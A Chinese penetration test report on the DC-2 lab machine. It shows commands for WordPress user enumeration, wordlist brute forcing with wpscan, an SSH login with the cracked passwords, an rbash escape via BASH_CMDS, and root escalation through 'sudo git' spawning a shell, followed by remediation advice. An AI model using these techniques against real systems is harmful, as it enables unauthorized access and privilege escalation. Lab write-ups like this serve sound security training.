## DC-2 渗透测试报告

### 渗透测试报告 – DC-2 靶机

**测试人员**：贺寿国
**测试日期**：2026年6月4日
**目标系统**：DC-2 (IP: 192.168.129.132)

------

###   1. 摘要

本次测试针对 DC-2 靶机进行渗透，成功获取系统 root 权限并读取最终 flag。主要利用路径为：WordPress 用户枚举 + 字典生成 + 密码爆破 → SSH 登录 tom 用户 → 绕过 rbash → 切换至 jerry 用户 → 利用 sudo git 提权至 root。靶机存在弱密码、rbash 配置不当、sudo 权限滥用等风险。

------

###   2. 测试范围

- **IP 地址**：192.168.129.132
- **开放端口**：80 (HTTP)、7744 (SSH)
- **目标系统**：Debian Linux, WordPress 4.7.10

------

###    3. 测试方法与工具

- **信息收集**：nmap, arp-scan

- **Web 应用扫描**：wpscan, whatweb

- **字典生成**：cewl

- **密码爆破**：wpscan (XML-RPC 接口)

- **Shell 操作**：ssh, BASH_CMDS 数组, su, sudo

- **提权利用**：git 手册页逃逸

  ------

  ### 4. 漏洞发现与利用详情

  #### 4.1 端口扫描与服务识别

  **操作**：

  bash

  ```
  nmap -sn 192.168.129.0/24     # 发现靶机 IP
  nmap -sV -p- 192.168.129.132  # 全端口扫描
  ```

  

  **结果**：

  - 80/tcp open http Apache 2.4.10 (Debian)
  - 7744/tcp open ssh OpenSSH 6.7p1 (Debian)

  **截图**：

  ![image-20260602201054746](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260602201054746.png)

  ------

  #### 4.2 WordPress 信息收集

  访问 `http://192.168.129.132` 发现页面重定向到 `http://dc-2`。修改本机 hosts 文件：

  bash

  ```
  echo "192.168.129.132 dc-2" | sudo tee -a /etc/hosts
  ```

  

  使用 `wpscan` 枚举用户：

  bash

  ```
  wpscan --url http://dc-2 -e u
  ```

  

  输出截图：

  ![image-20260603200530360](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260603200530360.png)

  **分析**：WordPress 存在用户枚举漏洞（默认功能），获得三个用户名。

  ------

  #### 4.3 密码字典生成与爆破

  使用 `cewl` 爬取网站内容生成自定义字典：

  bash

  ```
  cewl http://dc-2 -w dc2_passwords.txt
  ```

  

  用 `wpscan` 进行密码爆破（XML-RPC 接口）：

  bash

  ```
  wpscan --url http://dc-2 -U users.txt -P dc2_passwords.txt
  ```

  

  **成功爆破截图**：

  ![image-20260603201435039](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260603201435039.png)

  **原因**：密码来源于网页中的拉丁文单词，靶机未实施登录失败限制。

  ------

  #### 4.4 SSH 登录与 rbash 逃逸

  发现 SSH 在 7744 端口，使用 tom 账户登录：

  bash

  ```
  ssh tom@dc-2 -p 7744
  # 密码：parturient
  ```

  截图：

  ![image-20260603204210777](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260603204210777.png)

  登录后检查环境：

  bash

  ```
  echo $SHELL          # 输出 /bin/rbash
  ls -la /home/tom/usr/bin   # 仅 ls, less, scp, vi
  ```

  截图：

  ![image-20260603205939876](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260603205939876.png)

  **rbash 绕过方法**（利用 Bash 内部数组）：

  bash

  ```
  BASH_CMDS[a]=/bin/sh
  a
  ```

  

  执行后获得 `$` 提示符，逃逸成功。设置 PATH：

  bash

  ```
  export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
  ```

  截图：

  ![image-20260604191359978](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260604191359978.png)

  **原理**：`BASH_CMDS` 数组允许临时定义命令，不受 rbash 的 PATH 限制。

  ------

  #### 4.5 切换用户并利用 sudo 提权

  切换到 jerry 用户：

  bash

  ```
  su jerry
  # 密码：adipiscing
  ```

  

  检查 sudo 权限：

  bash

  ```
  sudo -l
  ```

  

  **输出**：

  

  ```
  User jerry may run the following commands on DC-2:
      (root) NOPASSWD: /usr/bin/git
  ```

  

  利用 git 提权：

  bash

  ```
  sudo git -p help
  # 在 man 页面中输入：
  !/bin/bash
  ```

  截图：

  ![image-20260604191439753](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260604191439753.png)

  成功获得 root shell：

  ![image-20260604194213876](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260604194213876.png)

  ------

  #### 4.6 获取最终 flag

  bash

  ```
  cat /root/final-flag.txt
  ```

  截图：

  ![image-20260604194238344](https://raw.githubusercontent.com/hsg1224/network/main/img/image-20260604194238344.png)

  ------

  ### 5. 风险评级与修复建议

  | 漏洞点                              | 风险等级 | 修复建议                                                     |
  | :---------------------------------- | :------- | :----------------------------------------------------------- |
  | WordPress 用户枚举                  | 低       | 禁用 REST API 的用户端点，或使用安全插件隐藏作者归档         |
  | 弱密码 (`adipiscing`, `parturient`) | 中       | 强制使用复杂密码策略，开启登录失败锁定                       |
  | SSH 端口暴露在非标准端口            | 低       | 可改为仅允许密钥登录，或使用跳板机                           |
  | rbash 可被绕过                      | 中       | 不要依赖 rbash 作为安全边界，应使用 `rssh` 或 `rbash` 配合严格 `PATH` 和禁用危险命令（如 `BASH_CMDS` 不受限） |
  | `sudo git` 可被滥用以提权           | 高       | 避免赋予普通用户运行 `git` 的 sudo 权限。如需使用，可限制其参数或使用 `sudo` 的 `NOEXEC` 功能 |

  ------

  ### 6. 结论

  DC-2 靶机存在多个安全配置缺陷，攻击者可通过组合漏洞（用户枚举、弱密码、rbash 绕过、sudo 滥用）获得完整系统控制权。建议按照上表修复。
